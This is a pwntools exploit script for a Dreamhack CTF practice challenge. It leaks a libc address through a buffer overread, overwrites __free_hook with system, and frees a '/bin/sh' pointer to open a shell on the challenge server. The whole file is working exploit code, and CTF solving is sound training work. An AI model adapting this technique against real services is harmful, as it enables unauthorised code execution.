#!/usr/bin/env python3

from pwn import *

exe = ELF("./fho_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript='''
                   b*main+129
                   b*main+134
                   b*main+211
                   b*main+252
                   b*main+344
                   c
                   ''')
        input()
    else:
        r = remote("host3.dreamhack.games", 19902   )

    return r


def main():
    r = conn()

    payload = b"a" * 72
    r.sendlineafter(b"Buf: ", payload)
    r.recvuntil(b"a" * 72)
    leak_libc = u64(r.recv(6) + b"\0\0")
    libc.address = leak_libc - 137994
    log.info("leak: " + hex(leak_libc))
    log.info("base: " + hex(libc.address))

    payload = libc.sym['__free_hook']
    r.sendlineafter(b"To write: ", str(payload))
    payload = libc.sym['system']
    r.sendlineafter(b"With: ", str(payload))

    payload = next(libc.search(b'/bin/sh'))
    r.sendlineafter(b"To free: ", str(payload))
    r.interactive()


if __name__ == "__main__":
    main()
